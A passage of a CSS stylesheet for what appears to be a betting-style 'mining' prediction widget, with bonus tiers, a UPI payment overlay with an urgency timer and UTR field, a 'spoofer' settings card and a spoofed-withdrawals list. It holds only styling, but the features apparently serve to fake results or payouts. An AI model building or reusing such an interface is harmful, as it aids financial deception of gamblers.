28%, transparent); transition: transform .15s, box-shadow .15s;}.energy-btn-primary:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 38%, transparent); }.energy-btn-primary:active { transform: scale(.98); }.energy-btn-secondary { width: 100%; padding: 10px; border-radius: 11px; font-size: 11.5px; font-weight: 600; cursor: pointer; font-family: var(--f); background: transparent; color: var(--t-body); border: 1px solid var(--card-bdr); transition: border-color .15s, transform .15s;}.energy-btn-secondary:hover { border-color: var(--pro-bdr-h); color: var(--t-title); }.energy-btn-secondary:active { transform: scale(.98); }:host(.light) .mining-energy-modal { background: rgba(255, 255, 255, 0.94); }.console-line { line-height: 1.4; animation: consoleFade .2s cubic-bezier(.16, 1, .3, 1) both; letter-spacing: .1px; }@keyframes consoleFade { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: translateY(0); } }.mining-history-modal { position: absolute; inset: 0; z-index: 100; background: rgba(10, 8, 28, 0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); display: flex; flex-direction: column; border-radius: 16px; padding: 12px; box-sizing: border-box; animation: modalPop .2s cubic-bezier(.16, 1, .3, 1) forwards;}.history-modal-content { flex: 1; display: flex; flex-direction: column; gap: 7px; overflow: hidden; padding-top: 18px; }.history-modal-title { font-size: 13px; font-weight: 800; color: var(--t-title); letter-spacing: -.15px; text-align: center; }.history-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 3px; scrollbar-width: none; padding: 2px 0; }.history-list::-webkit-scrollbar { display: none; }.history-list:empty::after { content: \'No mining history yet.\'; display: block; text-align: center; font-size: 10px; color: var(--t-dim); padding: 28px 0; }.hist-entry { display: flex; align-items: center; gap: 7px; padding: 7px 9px; border-radius: 8px; background: var(--back-bg); border: 1px solid var(--card-bdr); font-size: 9.5px; animation: consoleFade .18s ease both;}.hist-entry .hist-side { font-weight: 800; text-transform: uppercase; letter-spacing: .3px; font-size: 8.5px; min-width: 28px; }.hist-entry .hist-side.BigSmall_Big { color: var(--big); }.hist-entry .hist-side.BigSmall_Small { color: var(--small); }.hist-entry .hist-amt { flex: 1; color: var(--t-body); font-variant-numeric: tabular-nums; }.hist-entry .hist-net { font-weight: 800; font-variant-numeric: tabular-nums; min-width: 48px; text-align: right; }.hist-entry .hist-net.win { color: var(--mine); }.hist-entry .hist-net.loss { color: var(--pro); }.hist-entry .hist-time { font-size: 8px; color: var(--t-dim); min-width: 44px; text-align: right; }.history-clear-btn { width: 100%; padding: 9px; border-radius: 9px; border: 1px solid var(--card-bdr); background: transparent; color: var(--t-dim); font-size: 10px; font-weight: 600; cursor: pointer; font-family: var(--f); transition: border-color .15s, color .15s, transform .15s; flex-shrink: 0;}.history-clear-btn:hover { border-color: var(--pro-bdr-h); color: var(--pro); }.history-clear-btn:active { transform: scale(.98); }:host(.light) .mining-history-modal { background: rgba(255, 255, 255, 0.94); }@media (min-width: 768px) { .panel { width: min(90vw, 310px) } .menu-home-opt { padding: 12px 13px } .menu-home-name { font-size: 13.5px } }@media (max-width: 320px) { .panel { width: 94vw } .pro-timer { font-size: 24px } .pred-ball { width: 48px; height: 48px } .pred-size { padding: 6px 18px; font-size: 13px } .pro-card { padding: 14px 10px; min-height: 112px } .pred-hero { height: 56px } .mine-input { width: 55px; font-size: 11px } .mine-cta { padding: 10px; font-size: 12px } .mining-terminal { height: 64px } }.wg-overlay { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100%; background: rgba(0,0,0,0.75); z-index: 2005 }.wg-overlay.inactive { display: none }.wg-popup { position: fixed; top: 50%; left: calc(var(--bv-left, 0px) + var(--bv-width, 100%) / 2); transform: translate(-50%, -50%); z-index: 2006; width: min(300px, calc(var(--bv-width, 100%) - 32px)); background: #1e1e3a; border-radius: 18px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 8px 40px rgba(0,0,0,0.6) }.wg-popup.inactive { display: none }:host(.light) .wg-popup { background: #fff }.wg-close-x { position: absolute; top: 10px; right: 12px; width: 26px; height: 26px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; font-size: 12px; color: rgba(255,255,255,0.7); cursor: pointer; z-index: 1 }:host(.light) .wg-close-x { background: rgba(0,0,0,0.07); color: #666 }.wg-pop-hero { text-align: center; padding: 28px 20px 14px; background: #1e1e3a }:host(.light) .wg-pop-hero { background: #fff }.wg-pop-icon { font-size: 44px; line-height: 1; margin-bottom: 10px }.wg-pop-amount { font-size: 28px; font-weight: 900; color: #fff; letter-spacing: -0.5px; margin-bottom: 8px }:host(.light) .wg-pop-amount { color: #111 }.wg-pop-pill { display: inline-block; padding: 4px 12px; border-radius: 99px; background: rgba(245,180,0,0.15); border: 1px solid rgba(245,180,0,0.35); font-size: 10.5px; font-weight: 600; color: #f5c842; letter-spacing: .2px }:host(.light) .wg-pop-pill { background: rgba(249,89,89,0.08); border-color: rgba(249,89,89,0.25); color: #f95959 }.wg-pop-stats { display: flex; gap: 6px; padding: 0 16px 12px; justify-content: center }.wg-stat-chip { flex: 1; text-align: center; padding: 7px 4px; border-radius: 10px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); font-size: 10px; font-weight: 600; color: #c8cad0 }:host(.light) .wg-stat-chip { background: #f5f5ff; border-color: #e0e0f0; color: #555 }.wg-pop-body { padding: 0 16px 14px; font-size: 11.5px; color: #7b7e9a; line-height: 1.65; text-align: center }:host(.light) .wg-pop-body { color: #777 }.wg-pop-cta { display: block; width: calc(100% - 32px); margin: 0 16px 10px; padding: 14px; border-radius: 12px; border: none; background: linear-gradient(90deg, #f5a623 0%, #f5c842 100%); color: #1a1200; font-size: 15px; font-weight: 800; cursor: pointer; font-family: inherit; letter-spacing: .1px }:host(.light) .wg-pop-cta { background: linear-gradient(90deg, #f95959 0%, #ff8c6e 100%); color: #fff }.wg-pop-cta:active { opacity: .9 }.wg-pop-footer { display: flex; align-items: center; gap: 7px; padding: 8px 16px 16px; justify-content: center }.wg-checkbox { width: 17px; height: 17px; border-radius: 50%; border: 1.5px solid #4a4d6a; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; transition: background .15s, border-color .15s }.wg-checkbox.checked { background: #07c160; border-color: #07c160 }.wg-check-tick { font-size: 10px; color: #fff; opacity: 0; transition: opacity .15s }.wg-checkbox.checked .wg-check-tick { opacity: 1 }.wg-no-remind { font-size: 11px; color: #4a4d6a; cursor: pointer }:host(.light) .wg-no-remind { color: #aaa }.bonus-view { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100%; z-index: 9999; display: none; flex-direction: column; background: #1a1a2c; font-family: -apple-system, "system-ui", "Helvetica Neue", Helvetica, "Segoe UI", Arial, Roboto, sans-serif; color: #c8cad0 }:host(.light) .bonus-view { background: #f7f8ff; color: #333 }.bonus-hdr { display: flex; align-items: center; gap: 0; padding: 0 16px; height: 49px; background: #22224b; flex-shrink: 0 }:host(.light) .bonus-hdr { background: linear-gradient(90deg, #f95959 0%, #ff9a8e 100%) }.bonus-back-btn { background: none; border: none; padding: 0; margin-right: 8px; cursor: pointer; color: #fff; display: flex; align-items: center; justify-content: center; width: 32px; height: 32px }.bonus-back-btn svg { width: 20px; height: 20px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round }.bonus-ttl { font-size: 19px; font-weight: 400; color: #fff; flex: 1; text-align: center; margin-right: 32px }.bonus-scroll { flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch }.bonus-hero { padding: 24px 20px 16px; text-align: center }.bonus-hero-icon { font-size: 32px; margin-bottom: 6px }.bonus-h2 { font-size: 18px; font-weight: 700; color: #e8e9f0; margin: 0 0 5px; line-height: 1.2 }:host(.light) .bonus-h2 { color: #1a1a1a }.bonus-sub { font-size: 12px; color: #8b8ea0; line-height: 1.5; margin: 0 auto; max-width: 240px }:host(.light) .bonus-sub { color: #666 }.bonus-stats-row { display: flex; gap: 6px; padding: 0 14px; margin-bottom: 10px }.bonus-stat { flex: 1; text-align: center; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; padding: 10px 4px }:host(.light) .bonus-stat { background: #fff; border-color: #e8e8e8 }.bonus-stat-val { display: block; font-size: 15px; font-weight: 700; color: #f5c842; letter-spacing: -.2px }:host(.light) .bonus-stat-val { color: #d97706 }.bonus-stat-lbl { display: block; font-size: 9px; font-weight: 600; color: #5a5d72; text-transform: uppercase; letter-spacing: .3px; margin-top: 2px }:host(.light) .bonus-stat-lbl { color: #999 }.bonus-prog-card { margin: 0 14px 10px; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; padding: 11px 12px }:host(.light) .bonus-prog-card { background: #fff; border-color: #e8e8e8 }.bonus-prog-lbl { display: flex; justify-content: space-between; align-items: center; font-size: 10px; font-weight: 600; color: #5a5d72; text-transform: uppercase; letter-spacing: .3px; margin-bottom: 7px }:host(.light) .bonus-prog-lbl { color: #999 }.bonus-prog-count { color: #f5c842; font-weight: 700 }:host(.light) .bonus-prog-count { color: #d97706 }.bonus-bar { height: 6px; border-radius: 99px; background: #2d3060; overflow: hidden }:host(.light) .bonus-bar { background: #eee }.bonus-bar-fill { height: 100%; width: 0%; border-radius: 99px; background: #f5c842; transition: width .4s ease }:host(.light) .bonus-bar-fill { background: #f95959 }.bonus-section-ttl { font-size: 10px; font-weight: 700; color: #5a5d72; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 8px }:host(.light) .bonus-section-ttl { color: #bbb }.bonus-tiers { padding: 0 14px; margin-bottom: 14px }.bonus-tier { display: flex; align-items: center; gap: 10px; padding: 10px 12px; background: #22224b; border: 1px solid #2d3060; border-radius: 10px; margin-bottom: 5px }:host(.light) .bonus-tier { background: #fff; border-color: #e8e8e8 }.tier-badge { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; color: #fff; flex-shrink: 0; background: #3a3d6b }:host(.light) .tier-badge { background: #ccc }.t-bronze { background: #a0522d }.t-silver { background: #8a9bb5 }.t-gold { background: #d97706 }.t-diamond { background: #6d28d9 }.tier-info { flex: 1; font-size: 12px; color: #7b7e94; line-height: 1.5 }:host(.light) .tier-info { color: #666 }.tier-info b { color: #e8e9f0; font-weight: 700 }:host(.light) .tier-info b { color: #222 }.bonus-cta-btn { display: block; width: calc(100% - 28px); margin: 6px 14px 10px; padding: 13px; border-radius: 10px; border: none; background: #f5c842; color: #1a1a2c; font-size: 14px; font-weight: 700; cursor: pointer; font-family: inherit; transition: opacity .15s }:host(.light) .bonus-cta-btn { background: #f95959; color: #fff }.bonus-cta-btn:active { opacity: .85 }.bonus-link-preview { margin: 0 14px 14px; padding: 8px 10px; border-radius: 8px; background: #22224b; border: 1px solid #2d3060; font-size: 10px; color: #5a5d72; word-break: break-all; line-height: 1.5; font-family: monospace }:host(.light) .bonus-link-preview { background: #f5f5f5; border-color: #e8e8e8; color: #999 }.bonus-rules { padding: 0 14px; margin-bottom: 14px }.bonus-rule { font-size: 11px; color: #7b7e94; line-height: 1.7 }:host(.light) .bonus-rule { color: #666 }.settings-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.spoofer-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; padding: 14px 13px; margin-top: 2px }.spoofer-section { margin-bottom: 14px }.spoofer-section:last-of-type { margin-bottom: 12px }.spoofer-label { display: block; font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: var(--t-dim); margin-bottom: 8px }.spoofer-row { display: flex; align-items: center; gap: 8px }.spoofer-row input[type="range"] { flex: 1; height: 4px; -webkit-appearance: none; appearance: none; background: var(--strip); border-radius: 3px; outline: none; cursor: pointer }.spoofer-row input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; width: 14px; height: 14px; border-radius: 50%; background: var(--pro); border: 2px solid var(--panel-bg); cursor: pointer; box-shadow: 0 1px 6px rgba(139,92,246,.4) }.spoofer-row input[type="number"] { width: 52px; padding: 5px 6px; border-radius: 8px; border: 1px solid var(--card-bdr); background: var(--panel-bg); color: var(--t-title); font-size: 12px; font-weight: 700; font-family: var(--f); text-align: center; outline: none; -webkit-appearance: none; appearance: none; -moz-appearance: textfield }.spoofer-row input[type="number"]::-webkit-inner-spin-button, .spoofer-row input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0 }.spoofer-row input[type="number"]:focus { border-color: var(--pro) }.spoofer-unit { font-size: 11px; font-weight: 700; color: var(--t-dim); min-width: 14px }.spoofer-reset { display: block; width: 100%; padding: 8px; border-radius: 8px; border: 1px solid var(--card-bdr); background: transparent; color: var(--t-dim); font-size: 10.5px; font-weight: 600; cursor: pointer; font-family: var(--f); transition: all .15s; letter-spacing: .2px; -webkit-appearance: none; appearance: none }.spoofer-reset:hover { border-color: var(--pro); color: var(--pro) }.spoofer-reset:active { transform: scale(.97) }.pay-overlay { position: fixed; top: 0; left: var(--bv-left, 0px); width: var(--bv-width, 100%); height: 100vh; height: 100dvh; background: #1a1a2c; z-index: 99999; font-family: var(--f, system-ui, -apple-system, sans-serif); color: #c8cad0; display: flex; flex-direction: column; overflow: hidden; box-sizing: border-box; max-width: 100vw;}:host(.light) .pay-overlay { background: #fdfdfd; color: #1a1b25; }.pay-hdr { display: flex; align-items: center; justify-content: space-between; height: 56px; padding: 0 20px; flex-shrink: 0; background: #22224b; border-bottom: 1px solid rgba(255, 255, 255, 0.06); position: relative; z-index: 10;}:host(.light) .pay-hdr { background: #fff; border-bottom: 1px solid rgba(0, 0, 0, 0.04);}.pay-back { background: none; border: none; padding: 0; cursor: pointer; color: #fff; width: 32px; height: 32px; display: flex; align-items: center; justify-content: flex-start; transition: transform 0.2s ease, opacity 0.2s ease;}.pay-back:active { transform: translateX(-2px); opacity: 0.7; }:host(.light) .pay-back { color: #1a1b25; }.pay-back svg { width: 22px; height: 22px; stroke-width: 2.5; }.pay-ttl { font-size: 16px; font-weight: 700; color: #fff; letter-spacing: 0; }:host(.light) .pay-ttl { color: #111; }.pay-body { flex: 1; overflow-y: auto; overflow-x: hidden; -webkit-overflow-scrolling: touch; padding-bottom: 34px; }.pay-content { padding-top: 0; }@keyframes slideUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }.pay-anim { animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) backwards; }.pay-anim-1 { animation-delay: 0.05s; }.pay-anim-2 { animation-delay: 0.1s; }.pay-anim-3 { animation-delay: 0.15s; }.pay-anim-4 { animation-delay: 0.2s; }.pay-hero { position: relative; min-height: 148px; padding: 22px 20px 34px; overflow: hidden; background: linear-gradient(90deg, #fb8466 0%, #bd5bd4 33%, #7473fa 66%, #53b2fa 100%);}:host(.light) .pay-hero { background: linear-gradient(90deg, #ff6b6b 0%, #ff9b9b 52%, #fff2f2 100%); }.pay-hero::after { content: \'\'; position: absolute; inset: auto 0 0; height: 46px; background: linear-gradient(to bottom, rgba(26,26,44,0), #1a1a2c 82%);}:host(.light) .pay-hero::after { background: linear-gradient(to bottom, rgba(253,253,253,0), #fdfdfd 82%); }.pay-hero-top { position: relative; z-index: 1; display: flex; align-items: flex-start; justify-content: space-between; gap: 14px; }.pay-hero-label { display: block; color: rgba(255,255,255,.72); font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 7px; }.pay-hero-sub { position: relative; z-index: 1; margin-top: 10px; color: rgba(255,255,255,.82); font-size: 13px; font-weight: 600; }.pay-amount-box { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 32px 20px 24px; position: relative; }.pay-amount-bg { position: absolute; top: -70px; right: -40px; width: 210px; height: 150px; background: rgba(255,255,255,.26); filter: blur(48px); opacity: .6; border-radius: 50%; z-index: 0;}:host(.light) .pay-amount-bg { background: linear-gradient(90deg, #f95959, #ff8080); filter: blur(50px); opacity: 0.1; }.pay-timer-pill { display: flex; align-items: center; gap: 6px; position: relative; z-index: 1; background: rgba(34, 34, 75, 0.28); border: 1px solid rgba(255, 255, 255, 0.25); padding: 7px 12px; border-radius: 20px; flex-shrink: 0; box-shadow: inset 0 1px 0 rgba(255,255,255,.16);}:host(.light) .pay-timer-pill { background: #fff; border-color: rgba(0,0,0,0.05); box-shadow: 0 4px 12px rgba(0,0,0,0.03); }.pay-timer-pill.urgent { background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); animation: timerShake 0.45s ease infinite; }.pay-clock { width: 14px; height: 14px; color: #fff; flex-shrink: 0; }:host(.light) .pay-clock { color: #f95959; }.pay-timer-pill.urgent .pay-clock { color: #ef4444; }.pay-timer-txt { font-weight: 800; color: #fff; font-size: 14px; font-variant-numeric: tabular-nums; letter-spacing: 0.5px; }:host(.light) .pay-timer-txt { color: #f95959; }.pay-timer-pill.urgent .pay-timer-txt { color: #ef4444; }.pay-amt { display: block; position: relative; z-index: 1; font-size: 44px; font-weight: 900; color: #fff; letter-spacing: 0; line-height: .98; text-shadow: 0 8px 24px rgba(0,0,0,0.22); }:host(.light) .pay-amt { color: #fff; text-shadow: 0 8px 22px rgba(249, 89, 89, 0.18); }.pay-section { padding: 0 20px; margin-bottom: 16px; }.pay-section-hdr { font-size: 12px; font-weight: 800; color: #8b8ea0; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }:host(.light) .pay-section-hdr { color: #888; }.pay-qr-card { margin-top: -24px; position: relative; z-index: 2; }.pay-method-card, .pay-form-card { position: relative; z-index: 1; }.pay-qr-wrapper { background: #22224b; border-radius: 22px; padding: 18px 18px 16px; display: flex; flex-direction: column; align-items: center; border: 1px solid rgba(255, 255, 255, 0.07); box-shadow: 0 14px 34px rgba(0,0,0,0.24), inset 0 1px 0 rgba(255, 255, 255, 0.04);}:host(.light) .pay-qr-wrapper { background: #fff; border-color: rgba(0,0,0,0.04); box-shadow: 0 8px 30px rgba(0,0,0,0.04); }.pay-qr-box { background: #fff; border-radius: 18px; padding: 10px; margin-bottom: 12px; box-shadow: 0 7px 24px rgba(0,0,0,0.16), 0 0 0 1px rgba(0,0,0,0.05); position: relative; }.pay-qr { width: 172px; height: 172px; display: block; border-radius: 10px; opacity: 0; transition: opacity 0.4s ease; position: relative; z-index: 2; }.pay-qr.loaded { opacity: 1; }.pay-qr-skeleton { position: absolute; inset: 10px; border-radius: 10px; background: rgba(0,0,0,0.03); display: flex; align-items: center; justify-content: center; z-index: 1; }.pay-qr-skeleton svg { width: 28px; height: 28px; animation: paySpin 1s linear infinite; color: #8b8ea0; }@keyframes paySpin { 100% { transform: rotate(360deg); } }.pay-scan-text { font-size: 13px; color: #b8bbcf; font-weight: 700; text-align: center; line-height: 1.5; }:host(.light) .pay-scan-text { color: #666; }.pay-upi-row { display: flex; align-items: center; gap: 12px; background: #22224b; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 13px 14px; transition: background 0.2s, border-color 0.2s; box-shadow: inset 0 1px 0 rgba(255,255,255,.03);}.pay-upi-row:active { background: rgba(255, 255, 255, 0.05); }:host(.light) .pay-upi-row { background: #fafafa; border-color: rgba(0,0,0,0.06); }:host(.light) .pay-upi-row:active { background: #f5f5f5; border-color: #f95959; }.pay-upi-info { flex: 1; display: flex; flex-direction: column; gap: 3px; min-width: 0; }.pay-upi-lbl { font-size: 11px; color: #8b8ea0; font-weight: 800; text-transform: uppercase; letter-spacing: 0.4px; }:host(.light) .pay-upi-lbl { color: #999; }.pay-upi-id { font-size: 16px; font-weight: 800; color: #fff; letter-spacing: 0; font-family: var(--f, system-ui, -apple-system, sans-serif); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }:host(.light) .pay-upi-id { color: #111; }.pay-upi-actions { display: flex; gap: 8px; align-items: center; }.pay-copy-btn { background: rgba(160, 143, 255, 0.16); color: #fff; border: 1px solid rgba(160,143,255,.18); padding: 9px 15px; border-radius: 12px; font-size: 12px; font-weight: 800; cursor: pointer; transition: all 0.2s ease;}:host(.light) .pay-copy-btn { background: rgba(249, 89, 89, 0.08); color: #f95959; }.pay-copy-btn:hover { background: rgba(160, 143, 255, 0.22); }.pay-copy-btn:active { transform: scale(0.95); }.pay-copy-btn.copied { background: #22c55e !important; color: #fff !important; }.pay-route-card { width: 100%; margin-top: 10px; padding: 11px 12px; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; background: #22224b; color: #fff; display: flex; align-items: center; gap: 11px; position: relative; overflow: hidden; cursor: pointer; text-align: left; box-shadow: inset 3px 0 0 #a08fff, inset 0 1px 0 rgba(255,255,255,.04); font-family: var(--f, system-ui, -apple-system, sans-serif); transition: transform .18s ease, border-color .18s ease, background .18s ease;}.pay-route-card:active { transform: scale(.985); border-color: rgba(160,143,255,.38); background: #292958; }.pay-route-index { flex: 0 0 auto; min-width: 48px; padding: 8px 9px; border-radius: 12px; text-align: center; color: #fff; font-size: 12px; font-weight: 900; background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa); box-shadow: inset 0 1px 0 rgba(255,255,255,.18);}.pay-route-copy { position: relative; z-index: 1; flex: 1; display: flex; flex-direction: column; gap: 2px; min-width: 0; }.pay-route-title { font-size: 12.5px; font-weight: 800; color: #fff; letter-spacing: 0; line-height: 1.2; }.pay-route-sub { font-size: 11px; font-weight: 600; color: #b9bdd6; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }.pay-route-icon { position: relative; z-index: 1; width: 32px; height: 32px; flex: 0 0 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; background: rgba(160,143,255,.16);}.pay-route-icon svg { width: 19px; height: 19px; }.pay-route-note { margin-top: 10px; color: #8b8ea0; font-size: 12px; font-weight: 600; text-align: center; }:host(.light) .pay-route-card { background: #fafafa; border-color: rgba(0,0,0,.06); color: #111; box-shadow: inset 3px 0 0 #f95959; }:host(.light) .pay-route-index { background: linear-gradient(90deg, #f95959, #ff8080); }:host(.light) .pay-route-title { color: #111; }:host(.light) .pay-route-sub, :host(.light) .pay-route-note { color: #777; }:host(.light) .pay-route-icon { background: rgba(249,89,89,.08); color: #f95959; }.pay-field-wrapper { background: #22224b; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; display: flex; align-items: center; padding: 6px 6px 6px 16px; transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: inset 0 1px 0 rgba(255,255,255,.03);}.pay-field-wrapper:focus-within { border-color: #bd5bd4; box-shadow: 0 0 0 3px rgba(189, 91, 212, 0.15), 0 4px 12px rgba(0,0,0,0.2); }:host(.light) .pay-field-wrapper { background: #fafafa; border-color: rgba(0,0,0,0.08); box-shadow: 0 2px 12px rgba(0,0,0,0.02); }:host(.light) .pay-field-wrapper:focus-within { border-color: #f95959; box-shadow: 0 0 0 3px rgba(249, 89, 89, 0.1); }.pay-utr-input { flex: 1; background: transparent; border: none; outline: none; font-size: 15px; font-weight: 500; color: #fff; font-family: var(--f); padding: 10px 0; letter-spacing: 1px;}.pay-utr-input::placeholder { color: #5a5d72; font-weight: 400; letter-spacing: normal; }:host(.light) .pay-utr-input { color: #111; }:host(.light) .pay-utr-input::placeholder { color: #999; }.pay-paste-pill { background: rgba(255, 255, 255, 0.08); color: #fff; border: none; border-radius: 12px; padding: 9px 14px; font-size: 12px; font-weight: 800; cursor: pointer; transition: all 0.2s;}.pay-paste-pill:active { background: rgba(255, 255, 255, 0.1); transform: scale(0.95); }:host(.light) .pay-paste-pill { background: rgba(0,0,0,0.04); color: #111; }:host(.light) .pay-paste-pill:active { background: rgba(0,0,0,0.08); }.pay-utr-warn { display: flex; align-items: flex-start; gap: 6px; margin-top: 10px; padding: 0 4px; }.pay-utr-warn svg { width: 14px; height: 14px; color: #ef4444; flex-shrink: 0; margin-top: 1px; }.pay-utr-warn-txt { font-size: 11px; color: #ef4444; opacity: 0.9; line-height: 1.4; font-weight: 500; }.pay-submit-btn { width: 100%; padding: 16px; border-radius: 999px; border: none; background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa); background-size: 200% 200%; color: #fff; font-size: 16px; font-weight: 700; font-family: var(--f); cursor: pointer; position: relative; overflow: hidden; box-shadow: 0 10px 22px rgba(116, 115, 250, 0.28), inset 0 1px 0 rgba(255,255,255,0.22); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);}.pay-submit-btn:active:not(.disabled) { transform: translateY(2px) scale(0.98); box-shadow: 0 2px 10px rgba(116, 115, 250, 0.2), inset 0 1px 0 rgba(255,255,255,0.1); }.pay-submit-btn.disabled { background: #2a2a35 !important; color: #5a5d72 !important; box-shadow: none !important; cursor: not-allowed; }:host(.light) .pay-submit-btn { background: linear-gradient(90deg, #f95959, #ff8080); box-shadow: 0 6px 20px rgba(249, 89, 89, 0.3), inset 0 1px 0 rgba(255,255,255,0.3); }:host(.light) .pay-submit-btn.disabled { background: #e8e8e8 !important; color: #999 !important; }.pay-order-meta { display: flex; align-items: center; justify-content: space-between; padding: 12px 20px 0; margin-top: 4px; position: relative;}.pay-order-meta::before { content: \'\'; position: absolute; top: 0; left: 20px; right: 20px; height: 1px; background: rgba(255, 255, 255, 0.05); }:host(.light) .pay-order-meta::before { background: rgba(0, 0, 0, 0.05); }.pay-order-lbl { font-size: 12px; color: #5a5d72; font-weight: 500; }.pay-order-val { font-size: 13px; color: #8b8ea0; font-family: monospace; letter-spacing: 0.5px; }.pay-confirm-mask { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; padding: 20px; opacity: 0; pointer-events: none; transition: opacity 0.3s ease;}.pay-confirm-mask::before { content: \'\'; position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); }.pay-confirm-mask.active { opacity: 1; pointer-events: auto; }.pay-confirm-box { position: relative; z-index: 1; width: 100%; max-width: 310px; background: #22224b; border: 1px solid rgba(255,255,255,0.08); border-radius: 20px; padding: 28px 24px 24px; text-align: center; transform: scale(0.95) translateY(10px); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 20px 40px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05);}.pay-confirm-mask.active .pay-confirm-box { transform: scale(1) translateY(0); }:host(.light) .pay-confirm-box { background: #fff; border-color: rgba(0,0,0,0.05); box-shadow: 0 20px 40px rgba(0,0,0,0.1); }.pay-conf-icon { width: 48px; height: 48px; margin: 0 auto 16px; color: #c4b5fd; background: rgba(196, 181, 253, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; }.pay-conf-icon svg { width: 24px; height: 24px; }:host(.light) .pay-conf-icon { color: #f95959; background: rgba(249, 89, 89, 0.08); }.pay-conf-ttl { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; letter-spacing: -0.3px; }:host(.light) .pay-conf-ttl { color: #111; }.pay-conf-msg { font-size: 13.5px; color: #8b8ea0; line-height: 1.5; margin-bottom: 28px; }.pay-conf-msg b { color: #fff; font-weight: 600; }:host(.light) .pay-conf-msg { color: #666; }:host(.light) .pay-conf-msg b { color: #f95959; }.pay-conf-acts { display: flex; gap: 12px; }.pay-conf-btn { flex: 1; padding: 12px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; border: none; font-family: var(--f); outline: none; }.pay-conf-btn.no { background: rgba(255,255,255,0.05); color: #c8cad0; }:host(.light) .pay-conf-btn.no { background: rgba(0,0,0,0.04); color: #666; }.pay-conf-btn.no:active { background: rgba(255,255,255,0.1); }.pay-conf-btn.yes { background: linear-gradient(90deg, #fb8466, #bd5bd4); color: #fff; box-shadow: 0 4px 12px rgba(189, 91, 212, 0.3); }:host(.light) .pay-conf-btn.yes { background: linear-gradient(90deg, #f95959, #ff8080); box-shadow: 0 4px 12px rgba(249, 89, 89, 0.3); }.pay-conf-btn.yes:active { transform: scale(0.96); box-shadow: 0 2px 8px rgba(189, 91, 212, 0.2); }.pay-conf-btn.yes:disabled { opacity: 0.5; cursor: not-allowed; }.pay-conf-icon-success { color: #10b981 !important; background: rgba(16, 185, 129, 0.1) !important; }:host(.light) .pay-conf-icon-success { color: #10b981 !important; background: rgba(16, 185, 129, 0.08) !important; }.pay-ss-zone { display: block; border: 2px dashed rgba(255,255,255,0.12); border-radius: 12px; padding: 16px; cursor: pointer; text-align: center; margin-bottom: 16px; transition: border-color 0.2s; }.pay-ss-zone:hover { border-color: rgba(255,255,255,0.25); }:host(.light) .pay-ss-zone { border-color: rgba(0,0,0,0.1); }:host(.light) .pay-ss-zone:hover { border-color: rgba(0,0,0,0.2); }.pay-ss-placeholder { display: flex; flex-direction: column; align-items: center; gap: 8px; color: #8b8ea0; font-size: 13px; }.pay-ss-placeholder svg { width: 32px; height: 32px; opacity: 0.5; }.pay-ss-preview { max-width: 100%; max-height: 200px; border-radius: 8px; object-fit: contain; }.pay-ss-box { max-width: 340px; }#spoof-withdrawals-list { display: flex; flex-direction: column; gap: 8px; margin-top: 8px; max-height: 250px; overflow-y: auto; }.w-item { display: flex; flex-direction: column; gap: 8px; padding: 10px; border-radius: 10px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); }:host(.light) .w-item { background: #fafafa; border-color: rgba(0,0,0,0.06); }.w-info { display: grid; grid-template-columns: 1fr auto; gap: 4px; font-size: 11px; }.w-id { font-weight: 600; color: var(--t-title); grid-column: 1; }.w-amt { font-weight: 800; color: #fb8466; text-align: right; grid-column: 2; }:host(.light) .w-amt { color: #f95959; }.w-time { color: var(--t-dim); font-size: 9.5px; }.w-state { font-weight: 700; text-align: right; font-size: 10px; }.status-processing { color: #f5a623; }.status-success { color: #16a34a; }.status-failed { color: #ef4444; }.status-other { color: 